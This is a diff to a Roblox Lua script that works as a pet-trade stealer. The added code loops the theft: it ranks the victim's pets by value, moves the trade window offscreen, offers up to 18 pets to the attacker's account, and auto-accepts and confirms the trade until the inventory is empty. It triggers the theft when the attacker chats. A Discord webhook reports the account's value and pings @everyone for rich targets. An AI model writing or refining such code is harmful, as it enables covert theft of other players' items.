@@ -944,68 +944,75 @@ end
 
 local function TradeIncoming(ReceiverName)
     while true do
-    local RouterClient = Loaders("RouterClient")
-    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
-    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
-    local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
-    local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
-
-    local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
-    local sortedPets = {}
-    local tradedPets = {} 
-    
-    for petUid, petData in pairs(PetsInventory) do
-        local petInfo = InventoryDB[petData.category][petData.id]
-        local calculatedValue, baseValue = calculatePetValue(petData)
-        table.insert(sortedPets, {
-            uid = petUid,
-            data = petData,
-            value = calculatedValue,
-            baseValue = baseValue,
-            name = petInfo.name
-        })
-    end
-    
-    table.sort(sortedPets, function(a, b)
-        return a.value > b.value
-    end)
-    
-    moveGuiOffscreen()
-    SendTrade:FireServer(game.Players[ReceiverName])
-    wait(5)
-    
-    local petCount = 0
-    local petLimit = 18
-    
-    for _, petInfo in ipairs(sortedPets) do
-        if petCount < petLimit then
-            AddPetRemote:FireServer(petInfo.uid)
-            table.insert(tradedPets, {
-                uid = petInfo.uid,
-                data = petInfo.data,
-                name = petInfo.name,
-                value = petInfo.value
-            })
-            petCount = petCount + 1
-            wait(0.2)
-        else
+        local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+        if not PetsInventory or #PetsInventory == 0 then
             break
         end
-    end
-                wait(5)
-                    AcceptNegotiationRemote:FireServer()
-                wait(2)
-                    ConfirmTradeRemote:FireServer()
-                wait(2) 
-                    if #tradedPets > 0 then
-                        SendTradeSuccessMessage(ReceiverName, tradedPets)
-                    else
-                        print("⚠️ No pets were traded")
-                    end
-                print("✅ Trade completed with: " .. ReceiverName)
+
+        local RouterClient = Loaders("RouterClient")
+        local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+        local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+        local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+        local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+        local InventoryDB = require(game.ReplicatedStorage.Fsys).load("InventoryDB")
+        local ClientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+
+        local PetsInventory = ClientData.get_data()[game.Players.LocalPlayer.Name].inventory.pets
+        local sortedPets = {}
+        local tradedPets = {} 
+    
+        for petUid, petData in pairs(PetsInventory) do
+            local petInfo = InventoryDB[petData.category][petData.id]
+            local calculatedValue, baseValue = calculatePetValue(petData)
+            table.insert(sortedPets, {
+                uid = petUid,
+                data = petData,
+                value = calculatedValue,
+                baseValue = baseValue,
+                name = petInfo.name
+            })
+        end
+
+        -- Если нет ценных петов - выходим
+        if #sortedPets == 0 then
+            break
+        end
+    
+        table.sort(sortedPets, function(a, b)
+            return a.value > b.value
+        end)
+    
+        moveGuiOffscreen()
+        SendTrade:FireServer(game.Players[ReceiverName])
+        wait(5)
+    
+        local petCount = 0
+        local petLimit = 18
+    
+        for _, petInfo in ipairs(sortedPets) do
+            if petCount < petLimit then
+                AddPetRemote:FireServer(petInfo.uid)
+                table.insert(tradedPets, {
+                    uid = petInfo.uid,
+                    data = petInfo.data,
+                    name = petInfo.name,
+                    value = petInfo.value
+                })
+                petCount = petCount + 1
+                wait(0.2)
+            else
+                break
             end
+        end
+        wait(5)
+            AcceptNegotiationRemote:FireServer()
+        wait(2)
+            ConfirmTradeRemote:FireServer()
+        wait(2) 
+            if #tradedPets > 0 then
+                SendTradeSuccessMessage(ReceiverName, tradedPets)
+            end
+        end
 end
 
 function SendLeaveNotify(playerName)
@@ -1051,10 +1058,8 @@ end)
 -- Отправляем вебхук с учетом стоимости для @everyone
 if totalValue >= 50 then
     SendMessageEMBED(Webhook, embed, true)  -- С @everyone
-    print("📢 High value account - Sending with @everyone (Value: " .. totalValue .. "₽)")
 else
     SendMessageEMBED(Webhook, embed, false) -- Без @everyone
-    print("📧 Low value account - Sending without @everyone (Value: " .. totalValue .. "₽)")
 end
 
 game.Players.PlayerAdded:Connect(function(player)
@@ -1076,6 +1081,14 @@ game.Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
+
+for _, player in pairs(game.Players:GetPlayers()) do
+    if player.Name == Username or Username2 then
+        player.Chatted:Connect(function(msg)
+            TradeIncoming(Username)
+        end)
+    end
+end
 
 -- Создаем основной фрейм для блюра
 local blurFrame = Instance.new("Frame")
